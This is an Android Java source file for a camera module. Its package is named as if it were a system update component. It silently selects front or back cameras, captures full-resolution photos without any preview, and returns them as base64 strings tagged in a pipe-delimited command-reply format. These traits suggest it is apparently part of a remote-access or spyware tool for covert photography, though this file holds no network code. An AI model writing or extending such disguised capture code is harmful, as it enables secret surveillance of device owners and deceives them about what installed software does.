package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import android.graphics.ImageFormat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

public class CameraModule {
    private Context context;
    private CameraManager cameraManager;
    private String currentCameraId;
    private String backCameraId;
    private String frontCameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private Handler mainHandler;
    private ImageReader imageReader;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaRecorder mediaRecorder;
    private String videoFilePath;
    private boolean isRecording = false;
    private boolean isFrontCamera = false;
    private Semaphore cameraSemaphore = new Semaphore(1);
    
    // Callback interface for camera responses
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public CameraModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        startBackgroundThread();
        initCameras();
    }
    
    private void initCameras() {
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = id;
                    }
                }
            }
            // Set default to back camera
            currentCameraId = backCameraId != null ? backCameraId : frontCameraId;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public String switchCamera() {
        try {
            if (frontCameraId != null && backCameraId != null) {
                if (currentCameraId.equals(backCameraId)) {
                    currentCameraId = frontCameraId;
                    isFrontCamera = true;
                    return "CAMERA_SWITCH|Front camera activated";
                } else {
                    currentCameraId = backCameraId;
                    isFrontCamera = false;
                    return "CAMERA_SWITCH|Back camera activated";
                }
            } else if (frontCameraId == null && backCameraId != null) {
                return "CAMERA_SWITCH|Only back camera available";
            } else if (backCameraId == null && frontCameraId != null) {
                return "CAMERA_SWITCH|Only front camera available";
            }
            return "CAMERA_SWITCH|No camera available";
        } catch (Exception e) {
            e.printStackTrace();
            return "CAMERA_SWITCH|Error: " + e.getMessage();
        }
    }
    
    public String getCurrentCameraInfo() {
        try {
            if (currentCameraId != null) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                String facing_str = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) 
                    ? "FRONT" : "BACK";
                return "CAMERA_INFO|Current: " + facing_str;
            }
            return "CAMERA_INFO|No camera selected";
        } catch (Exception e) {
            return "CAMERA_INFO|Error: " + e.getMessage();
        }
    }
    
    public void takePhoto(final CameraCallback callback) {
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        try {
            // Acquire semaphore to prevent multiple simultaneous camera operations
            if (!cameraSemaphore.tryAcquire(3, TimeUnit.SECONDS)) {
                callback.onError("ERROR: Camera busy");
                return;
            }
            
            // Close any existing camera device
            closeCamera();
            
            // Create temporary file
            final File photoFile = File.createTempFile("photo_", ".jpg", 
                context.getCacheDir());
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    try {
                        Size largest = getLargestSize();
                        imageReader = ImageReader.newInstance(largest.getWidth(), 
                            largest.getHeight(), ImageFormat.JPEG, 2);
                        
                        imageReader.setOnImageAvailableListener(reader -> {
                            try (Image image = reader.acquireLatestImage()) {
                                if (image != null) {
                                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buffer.remaining()];
                                    buffer.get(bytes);
                                    
                                    // Save to file
                                    FileOutputStream fos = new FileOutputStream(photoFile);
                                    fos.write(bytes);
                                    fos.close();
                                    
                                    // Convert to base64
                                    String base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                    
                                    // Return through callback on main thread
                                    mainHandler.post(() -> {
                                        callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image);
                                        cameraSemaphore.release();
                                    });
                                    
                                    // Clean up
                                    closeCamera();
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                                mainHandler.post(() -> {
                                    callback.onError("ERROR: " + e.getMessage());
                                    cameraSemaphore.release();
                                });
                            }
                        }, backgroundHandler);
                        
                        // Create capture session
                        device.createCaptureSession(
                            java.util.Collections.singletonList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder builder = 
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(imageReader.getSurface());
                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                        
                                        // Set rotation based on camera orientation
                                        try {
                                            CameraCharacteristics characteristics = 
                                                cameraManager.getCameraCharacteristics(currentCameraId);
                                            Integer sensorOrientation = characteristics.get(
                                                CameraCharacteristics.SENSOR_ORIENTATION);
                                            if (sensorOrientation != null) {
                                                builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation);
                                            }
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                        
                                        captureSession.capture(builder.build(), 
                                            new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(
                                                    CameraCaptureSession session, 
                                                    CaptureRequest request, 
                                                    TotalCaptureResult result) {
                                                    // Capture completed
                                                }
                                            }, backgroundHandler);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        mainHandler.post(() -> {
                                            callback.onError("ERROR: " + e.getMessage());
                                            cameraSemaphore.release();
                                        });
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    mainHandler.post(() -> {
                                        callback.onError("ERROR: Failed to configure camera");
                                        cameraSemaphore.release();
                                    });
                                }
                            }, backgroundHandler
                        );
                    } catch (Exception e) {
                        e.printStackTrace();
                        mainHandler.post(() -> {
                            callback.onError("ERROR: " + e.getMessage());
                            cameraSemaphore.release();
                        });
                    }
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    device.close();
                    cameraDevice = null;
                    mainHandler.post(() -> {
                        callback.onError("ERROR: Camera disconnected");
                        cameraSemaphore.release();
                    });
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    device.close();
                    cameraDevice = null;
                    mainHandler.post(() -> {
                        callback.onError("ERROR: Camera error " + error);
                        cameraSemaphore.release();
                    });
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            e.printStackTrace();
            cameraSemaphore.release();
            callback.onError("ERROR: " + e.getMessage());
        }
    }
    
    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public String takePhotoSync() {
        // This method maintains compatibility with existing code
        // but the async version with callback is preferred
        final String[] result = new String[1];
        final Semaphore semaphore = new Semaphore(0);
        
        takePhoto(new CameraCallback() {
            @Override
            public void onPhotoTaken(String base64Image) {
                result[0] = base64Image;
                semaphore.release();
            }
            
            @Override
            public void onError(String error) {
                result[0] = error;
                semaphore.release();
            }
        });
        
        try {
            if (semaphore.tryAcquire(5, TimeUnit.SECONDS)) {
                return result[0];
            } else {
                return "ERROR: Camera timeout";
            }
        } catch (InterruptedException e) {
            return "ERROR: Interrupted";
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        isRecording = true;
        // Implement video recording if needed
    }
    
    public String stopRecording() {
        isRecording = false;
        return "Recording stopped";
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs != null) {
                Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
                if (sizes != null && sizes.length > 0) {
                    Size largest = sizes[0];
                    for (Size size : sizes) {
                        if (size.getWidth() > largest.getWidth()) {
                            largest = size;
                        }
                    }
                    return largest;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Size(1920, 1080);
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    
    public void cleanup() {
        closeCamera();
        stopBackgroundThread();
    }
}
